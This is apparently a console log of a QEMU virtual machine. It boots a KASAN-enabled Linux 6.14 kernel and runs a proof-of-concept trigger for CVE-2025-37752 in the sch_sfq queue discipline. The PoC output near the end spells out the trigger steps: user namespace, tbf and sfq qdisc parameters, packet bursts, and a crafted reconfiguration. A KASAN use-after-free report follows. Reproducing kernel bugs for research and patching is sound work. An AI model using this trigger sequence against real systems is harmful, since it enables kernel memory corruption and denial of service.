bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 6.14.0-13336-g8c0cea59d40c-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 16:10:45 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 252428829 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000004] tsc: Detected 3187.200 MHz processor
[    0.000330] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000348] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000350] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002536] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002541] Using GB pages for direct mapping
[    0.002738] RAMDISK: [mem 0x7fe8f000-0x7ffdffff]
[    0.002741] ACPI: Early table checksum verification disabled
[    0.002743] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002746] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002750] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002753] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002756] ACPI: FACS 0x000000007FFE0000 000040
[    0.002757] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002759] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002760] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002762] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002762] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002763] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002764] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002764] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002765] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.002944] No NUMA configuration found
[    0.002944] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002946] NODE_DATA(0) allocated [mem 0x7fe8b800-0x7fe8efff]
[    0.002954] Zone ranges:
[    0.002954]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002956]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002957]   Normal   empty
[    0.002957] Movable zone start for each node
[    0.002958] Early memory node ranges
[    0.002958]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002959]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002960] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.003143] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.003181] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.009967] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.183895] kasan: KernelAddressSanitizer initialized
[    0.184096] ACPI: PM-Timer IO Port: 0x608
[    0.184107] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.184134] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.184137] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.184138] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.184139] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.184140] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.184140] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.184142] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.184143] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.184145] TSC deadline timer available
[    0.184148] CPU topo: Max. logical packages:   1
[    0.184148] CPU topo: Max. logical dies:       1
[    0.184149] CPU topo: Max. dies per package:   1
[    0.184150] CPU topo: Max. threads per core:   1
[    0.184151] CPU topo: Num. cores per package:     2
[    0.184152] CPU topo: Num. threads per package:   2
[    0.184152] CPU topo: Allowing 2 present CPUs plus 0 hotplug CPUs
[    0.184164] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.184176] kvm-guest: KVM setup pv remote TLB flush
[    0.184178] kvm-guest: setup PV sched yield
[    0.184183] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.184184] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.184185] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.184185] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.184186] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.184187] Booting paravirtualized kernel on KVM
[    0.184189] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.192628] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.195522] percpu: Embedded 63 pages/cpu s220760 r8192 d29096 u1048576
[    0.195554] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.195592] random: crng init done
[    0.195593] printk: log buffer data + meta data: 262144 + 917504 = 1179648 bytes
[    0.195692] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.197543] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.197582] Fallback order for Node 0: 0 
[    0.197584] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.197585] Policy zone: DMA32
[    0.197586] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.197587] stackdepot: allocating hash table via alloc_large_system_hash
[    0.197588] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.230418] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.231471] Dynamic Preempt: voluntary
[    0.233267] rcu: Preemptible hierarchical RCU implementation.
[    0.233268] rcu: 	RCU event tracing is enabled.
[    0.233269] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.233271] 	Trampoline variant of Tasks RCU enabled.
[    0.233271] 	Tracing variant of Tasks RCU enabled.
[    0.233272] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.233273] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.233286] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.233288] RCU Tasks Trace: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.241910] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.242139] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.244423] Console: colour VGA+ 80x25
[    0.244451] printk: legacy console [ttyS0] enabled
[    0.283384] ACPI: Core revision 20240827
[    0.283732] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.284314] APIC: Switch to symmetric I/O mode setup
[    0.284715] x2apic enabled
[    0.285029] APIC: Switched APIC routing to: physical x2apic
[    0.285364] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.285775] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.286300] kvm-guest: setup PV IPIs
[    0.287154] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.287519] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.288124] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.289200] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.289627] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.290121] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.290454] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.290927] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall and VM exit
[    0.291121] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.291456] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.292121] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.292533] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.293121] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.293595] MMIO Stale Data: Unknown: No mitigations
[    0.293886] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.294121] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.294480] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.295121] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.295564] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.295914] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.296121] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.313441] Freeing SMP alternatives memory: 48K
[    0.313781] pid_max: default: 32768 minimum: 301
[    0.314112] LSM: initializing lsm=capability,selinux
[    0.314141] SELinux:  Initializing.
[    0.315166] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.315609] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.316550] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.317120] Performance Events: unsupported CPU family 6 model 183 no PMU driver, software events only.
[    0.317143] signal: max sigframe size: 3632
[    0.317416] rcu: Hierarchical SRCU implementation.
[    0.317689] rcu: 	Max phase no-delay instances is 400.
[    0.318042] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    0.318497] smp: Bringing up secondary CPUs ...
[    0.318891] smpboot: x86: Booting SMP configuration:
[    0.319123] .... node  #0, CPUs:      #1
[    0.319195] smp: Brought up 1 node, 2 CPUs
[    0.319611] smpboot: Total of 2 processors activated (12748.80 BogoMIPS)
[    0.320261] Memory: 1673096K/2096632K available (51705K kernel code, 8743K rwdata, 11344K rodata, 6088K init, 1208K bss, 418460K reserved, 0K cma-reserved)
[    0.322182] devtmpfs: initialized
[    0.324777] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.325124] posixtimers hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.325570] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.326095] PM: RTC time: 16:14:40, date: 2026-05-05
[    0.326237] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.326798] audit: initializing netlink subsys (disabled)
[    0.327141] audit: type=2000 audit(1777997680.955:1): state=initialized audit_enabled=0 res=1
[    0.327332] thermal_sys: Registered thermal governor 'step_wise'
[    0.327654] cpuidle: using governor menu
[    0.327654] PCI: Using configuration type 1 for base access
[    0.328147] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.329212] HugeTLB: allocation took 0ms with hugepage_allocation_threads=1
[    0.329603] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.330003] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.350236] ACPI: Added _OSI(Module Device)
[    0.350500] ACPI: Added _OSI(Processor Device)
[    0.350759] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.351035] ACPI: Added _OSI(Processor Aggregator Device)
[    0.358336] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.363814] ACPI: Interpreter enabled
[    0.364153] ACPI: PM: (supports S0 S3 S4 S5)
[    0.364404] ACPI: Using IOAPIC for interrupt routing
[    0.364716] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.365122] PCI: Using E820 reservations for host bridge windows
[    0.365801] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.380262] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.380629] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.381067] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.381174] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.381961] PCI host bridge to bus 0000:00
[    0.382146] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.382532] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.382917] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.383123] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.383548] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.383984] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.385162] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    0.389794] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    0.394189] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    0.394995] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    0.395140] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    0.395529] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    0.395882] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    0.396122] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    0.396628] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    0.397281] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.397694] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.398254] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    0.399374] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    0.399748] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    0.400100] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    0.400185] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.404704] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    0.405939] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    0.406128] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    0.406446] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    0.411850] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.413519] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.413519] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.413963] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.414120] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.415867] iommu: Default domain type: Translated
[    0.416122] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.416686] SCSI subsystem initialized
[    0.417173] ACPI: bus type USB registered
[    0.417443] usbcore: registered new interface driver usbfs
[    0.417790] usbcore: registered new interface driver hub
[    0.418139] usbcore: registered new device driver usb
[    0.418514] pps_core: LinuxPPS API ver. 1 registered
[    0.418819] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.420131] PTP clock support registered
[    0.421202] Advanced Linux Sound Architecture Driver Initialized.
[    0.421984] NetLabel: Initializing
[    0.422122] NetLabel:  domain hash size = 128
[    0.422375] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.422753] NetLabel:  unlabeled traffic allowed by default
[    0.423166] PCI: Using ACPI for IRQ routing
[    0.423465] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.423479] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.423814] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.424122] vgaarb: loaded
[    0.424359] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.424646] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.428177] clocksource: Switched to clocksource kvm-clock
[    0.428837] VFS: Disk quotas dquot_6.6.0
[    0.429078] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.429789] pnp: PnP ACPI init
[    0.431147] pnp: PnP ACPI: found 6 devices
[    0.442287] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.442841] NET: Registered PF_INET protocol family
[    0.443272] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.444220] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.444714] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.445169] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.445895] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.446531] TCP: Hash tables configured (established 16384 bind 16384)
[    0.446993] UDP hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.447408] UDP-Lite hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.447907] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.448516] RPC: Registered named UNIX socket transport module.
[    0.448859] RPC: Registered udp transport module.
[    0.449136] RPC: Registered tcp transport module.
[    0.449408] RPC: Registered tcp-with-tls transport module.
[    0.449725] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.450490] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.450851] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.451211] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.451608] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.452005] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.452497] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.452835] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.453209] PCI: CLS 0 bytes, default 64
[    0.453515] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.453654] Unpacking initramfs...
[    0.454005] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.456380] Initialise system trusted keyrings
[    0.456736] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.457560] NFS: Registering the id_resolver key type
[    0.457860] Key type id_resolver registered
[    0.458108] Key type id_legacy registered
[    0.458430] 9p: Installing v9fs 9p2000 file system support
[    0.465296] Key type asymmetric registered
[    0.465583] Asymmetric key parser 'x509' registered
[    0.465921] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.466374] io scheduler mq-deadline registered
[    0.466644] io scheduler kyber registered
[    0.467247] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.467798] ACPI: button: Power Button [PWRF]
[    0.468640] Freeing initrd memory: 1348K
[    0.469498] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.470047] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.471391] Non-volatile memory driver v1.3
[    0.471638] Linux agpgart interface v0.103
[    0.471998] ACPI: bus type drm_connector registered
[    0.486240] loop: module loaded
[    0.487802] scsi host0: ata_piix
[    0.488295] scsi host1: ata_piix
[    0.488581] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    0.489024] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    0.490585] e100: Intel(R) PRO/100 Network Driver
[    0.490865] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.491219] e1000: Intel(R) PRO/1000 Network Driver
[    0.491508] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.646220] ata2: found unknown device (class 0)
[    0.646848] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.648775] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.667531] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.668676] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.687363] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.823464] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.109538] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.109935] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.110367] e1000e: Intel(R) PRO/1000 Network Driver
[    1.110653] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.111022] sky2: driver version 1.30
[    1.111534] usbcore: registered new interface driver usblp
[    1.111861] usbcore: registered new interface driver usb-storage
[    1.112275] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.113240] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.113536] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.114333] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.115096] rtc_cmos 00:05: RTC can wake from S4
[    1.116301] rtc_cmos 00:05: registered as rtc0
[    1.116627] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.121176] device-mapper: ioctl: 4.49.0-ioctl (2025-01-17) initialised: dm-devel@lists.linux.dev
[    1.121735] intel_pstate: CPU model not supported
[    1.122111] hid: raw HID events driver (C) Jiri Kosina
[    1.122726] usbcore: registered new interface driver usbhid
[    1.123055] usbhid: USB HID core driver
[    1.124206] Initializing XFRM netlink socket
[    1.124499] NET: Registered PF_INET6 protocol family
[    1.125593] Segment Routing with IPv6
[    1.125836] In-situ OAM (IOAM) with IPv6
[    1.126111] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.126962] NET: Registered PF_PACKET protocol family
[    1.127319] 9pnet: Installing 9P2000 support
[    1.127600] Key type dns_resolver registered
[    1.128159] IPI shorthand broadcast: enabled
[    1.140008] sched_clock: Marking stable (1097001704, 42975194)->(1143902935, -3926037)
[    1.140679] registered taskstats version 1
[    1.140921] Loading compiled-in X.509 certificates
[    1.148734] Demotion targets for Node 0: null
[    1.150029] PM:   Magic number: 10:234:236
[    1.150308] printk: legacy console [netcon0] enabled
[    1.150602] netconsole: network logging started
[    1.150966] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.151575] kworker/u8:1 (57) used greatest stack depth: 29648 bytes left
[    1.152536] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.153040] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.153528] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.154034] cfg80211: failed to load regulatory.db
[    1.154327] ALSA device list:
[    1.154503]   No soundcards found.
[    1.155568] Freeing unused kernel image (initmem) memory: 6088K
[    1.155821] Write protecting the kernel read-only data: 65536k
[    1.156410] Freeing unused kernel image (text/rodata gap) memory: 1540K
[    1.156833] Freeing unused kernel image (rodata/data gap) memory: 944K
[    1.164886] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.165199] Run /init as init process
[    1.166064] mkdir (60) used greatest stack depth: 28896 bytes left
[    1.166837] mount (61) used greatest stack depth: 28232 bytes left
[    1.167366] mount (62) used greatest stack depth: 28208 bytes left

secb: rootfs ready
---- poc begin ----
poc: starting CVE-2025-37752 trigger (sch_sfq OOB)
poc: userns ready (CAP_NET_ADMIN in new netns)
[    1.176345] sch_tbf: burst 100 is lower than device lo mtu (65550) !
poc: lo up
poc: tbf root 1:0 installed (rate=80 B/s, burst=100)
poc: sfq 2:0 installed (li[    1.176940] sch_tbf: burst 99 is lower than device lo mtu (65550) !
mit=2,flows=1,depth=1 -> q->limit=1)
poc: burst-sending 3 packets to trigger enqueue/drop path
poc: send_pkts 3 ok, 0 err
poc: tbf 1:0 reconfigured to rate=1/burst=99/overhead=0xffff
poc: sleeping 2s waiting for qdisc watchdog & OOB write
[    1.534987] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    1.876886] ==================================================================
[    1.877202] BUG: KASAN: use-after-free in sfq_dequeue+0xa6c/0xde0
[    1.877466] Read of size 2 at addr ffff88800a22f1ec by task swapper/0/0
[    1.877731] 
[    1.877801] CPU: 0 UID: 0 PID: 0 Comm: swapper/0 Not tainted 6.14.0-13336-g8c0cea59d40c-dirty #1 PREEMPT(voluntary) 
[    1.877804] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.877805] Call Trace:
[    1.877806]  <IRQ>
[    1.877807]  dump_stack_lvl+0x53/0x70
[    1.877811]  print_report+0xce/0x670
[    1.877814]  ? sfq_dequeue+0xa6c/0xde0
[    1.877816]  kasan_report+0xce/0x100
[    1.877817]  ? sfq_dequeue+0xa6c/0xde0
[    1.877819]  sfq_dequeue+0xa6c/0xde0
[    1.877821]  qdisc_peek_dequeued+0x77/0x290
[    1.877823]  tbf_dequeue+0x89/0x1020
[    1.877825]  ? __netif_schedule+0xbd/0x100
[    1.877827]  __qdisc_run+0x16f/0x18f0
[    1.877829]  ? __pfx___hrtimer_run_queues+0x10/0x10
[    1.877833]  net_tx_action+0x41e/0x6a0
[    1.877834]  handle_softirqs+0x1b5/0x5c0
[    1.877837]  ? __pfx_handle_softirqs+0x10/0x10
[    1.877838]  irq_exit_rcu+0xaf/0xe0
[    1.877839]  sysvec_apic_timer_interrupt+0x6c/0x80
[    1.877842]  </IRQ>
[    1.877843]  <TASK>
[    1.877843]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[    1.877845] RIP: 0010:pv_native_safe_halt+0xf/0x20
[    1.877847] Code: 7c c0 00 c3 cc cc cc cc 0f 1f 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d 53 24 1f 00 fb f4 <c3> cc cc cc cc 66 2e 0f 1f 84 00 00 00 00 00 66 90 90 90 90 90 90
[    1.877849] RSP: 0018:ffffffff85007e28 EFLAGS: 00000206
[    1.877851] RAX: ffff8880e6972000 RBX: 0000000000000000 RCX: ffffffff8425c051
[    1.877852] RDX: ffffed100da060b3 RSI: 0000000000000004 RDI: 0000000000003cf4
[    1.877852] RBP: fffffbfff0a02c88 R08: 0000000000000001 R09: ffffed100da060b2
[    1.877853] R10: ffff88806d030593 R11: ffff88806d027c60 R12: ffffffff85016440
[    1.877854] R13: ffffffff85880c10 R14: 1ffffffff0a00fcb R15: 0000000000000000
[    1.877855]  ? ct_kernel_exit.constprop.0+0xa1/0xc0
[    1.877857]  default_idle+0x9/0x10
[    1.877859]  default_idle_call+0x3a/0x60
[    1.877860]  do_idle+0x35a/0x4d0
[    1.877863]  ? __pfx_do_idle+0x10/0x10
[    1.877864]  cpu_startup_entry+0x4f/0x60
[    1.877865]  rest_init+0x10e/0x140
